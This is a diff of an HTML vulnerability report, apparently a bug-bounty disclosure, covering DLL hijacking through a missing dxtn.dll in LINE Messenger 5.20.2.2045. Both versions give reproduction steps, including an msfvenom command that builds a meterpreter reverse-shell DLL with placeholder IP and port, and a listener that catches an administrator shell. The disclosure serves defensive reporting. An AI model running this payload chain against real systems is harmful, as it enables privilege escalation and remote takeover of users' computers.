@@ -21,18 +21,28 @@
 
 <p>Line Ver 5.20.2.2045 when executed, searches for a missing (<code>dxtn.dll</code>) file, which forces the Safe DLL search order to move to directories defined in the <code>PATH</code> variable. A low privileged attacker having write access to any of the directories defined in the <code>PATH</code> variable can put a malicious file (Metasploit Backdoor) with the name <code>dxtn.dll</code> forcing the search order to complete and Escalate privileges when an administrator executes Line.</p>
 
-<p><em>Note: The root cause of this vulnerability is the missing DLL File which can cause attacks like EOP (Escalation of Privleges), DLL Hijacking and may also allow Persistence (Persistent Access for the Attacker)</em></p>
+<p><em><strong>Note</strong>: The root cause of this vulnerability is the missing DLL File which can cause attacks like EOP (Escalation of Privleges), DLL Hijacking and may also allow Persistence (Persistent Access for the Attacker)</em></p>
 
-<p>Steps To Reproduce:
-1. Install Line on both Admin and Non-Admin User
-2. Logon to Non-Admin User
-3. You can create a malicious file with the name dxtn.dll using msfvenom with the following command:
-<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT –encrypt aes256 –encrypt-key YOUR_PASSWORD -f dll &gt; dxtn.dll</code>
-4. Start a Listener on your defined IP and port for the DLL backdoor
-5. Copy the malicious dxtn.dll file to any directory defined in the PATH variable
-7. Logout and Login as Administrator
-8. Execute LINE Messenger
-9. Metasploit Should Receive an administrator Shell of the target system</p>
+<p>Steps To Reproduce:</p>
+
+<ol>
+<li><p>Install Line on both Admin and Non-Admin User</p></li>
+
+<li><p>Logon to Non-Admin User</p></li>
+
+<li><p>You can create a malicious file with the name dxtn.dll using msfvenom with the following command:
+<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT –encrypt aes256 –encrypt-key YOUR_PASSWORD -f dll &gt; dxtn.dll</code></p></li>
+
+<li><p>Start a Listener on your defined IP and port for the DLL backdoor</p></li>
+
+<li><p>Copy the malicious dxtn.dll file to any directory defined in the PATH variable</p></li>
+
+<li><p>Logout and Login as Administrator</p></li>
+
+<li><p>Execute LINE Messenger</p></li>
+
+<li><p>Metasploit Should Receive an administrator Shell of the target system</p></li>
+</ol>
 
 <h2 id="supporting-material-references">Supporting Material/References:</h2>
 
